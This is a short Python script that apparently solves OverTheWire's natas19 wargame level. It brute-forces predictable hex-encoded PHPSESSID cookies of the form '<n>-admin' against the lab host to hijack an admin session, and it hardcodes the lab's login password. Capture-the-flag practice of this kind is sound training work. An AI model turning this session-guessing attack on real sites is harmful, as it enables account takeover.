import requests
from requests.auth import HTTPBasicAuth
from time import sleep

def main():
	Auth = HTTPBasicAuth('natas19','4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
	Data = {'username':'admin','password':'admin','admin':'1'}
	maxchange = 0

	for i in range(0,640):
		sesstr = str(i) + '-admin'
		sessid = sesstr.encode('hex')
		cookie = {"PHPSESSID": sessid}
		r = requests.get("http://natas19.natas.labs.overthewire.org/index.php?debug", params = Data, auth = Auth, cookies = cookie)
		if('logged in as a regular user' not in r.text):
			print("Admin:",i)
			print(r.text)
			break
	
	return

if __name__ == '__main__':
	main()
